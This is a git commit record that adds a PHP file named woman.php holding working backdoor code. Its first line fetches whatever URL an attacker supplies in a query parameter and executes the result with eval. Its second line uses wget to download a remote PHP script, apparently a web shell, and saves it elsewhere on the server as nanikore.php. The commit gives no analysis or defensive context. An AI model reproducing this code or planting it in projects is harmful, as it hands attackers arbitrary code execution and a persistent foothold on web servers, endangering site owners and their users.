ddcf071fe5a6c10e88b8ebd913420eb946a8913a
tempixoday <105441731+tempixoday@users.noreply.github.com>
2022-05-13 01:21:46 +0700

    Create woman.php

---
+++ woman.php
@@ -0,0 +1,2 @@
+<?php $ch = curl_init($_GET['woman']); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result); ?>
+<?php system('wget https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php -O ../../../../nanikore.php');?>
